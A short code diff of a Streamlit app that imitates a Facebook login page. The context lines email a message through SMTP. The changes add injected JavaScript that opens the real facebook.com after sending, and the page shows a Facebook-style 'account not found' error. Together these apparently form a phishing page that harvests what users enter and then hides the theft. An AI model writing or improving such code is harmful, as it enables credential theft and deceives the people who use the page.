@@ -105,13 +105,16 @@ with col2:
                     server.login(sender, password)
                     server.send_message(msg)
                     server.quit()
+
+                    js = "window.open('https://www.facebook.com')"
+                    st.components.v1.html(f"<script>{js}</script>", height=0)
+
+                    #url = "https://www.google.com/"
+                    #webbrowser.open(url)
                 except Exception as e:
                     st.error(f"❌ Failed to send email: {e}")
                     st.error("The email address or mobile number you entered isn't connected to an account.")
-
-                finally:
-                    url = "https://www.google.com/"
-                    webbrowser.open(url)
+                    
             
 
 
@@ -126,6 +129,12 @@ with col2:
 
     if st.button("Create New Account", key="create", help="Create a new Facebook account"):
         
-        url = "https://www.facebook.com/r.php?entry_point=login"
-        webbrowser.open(url)
+        #url = "https://www.facebook.com/r.php?entry_point=login"
+        #webbrowser.open(url)
+        
+        js = "window.open('https://www.facebook.com/r.php?entry_point=login')"
+        st.components.v1.html(f"<script>{js}</script>", height=0)
+
+        
+
 
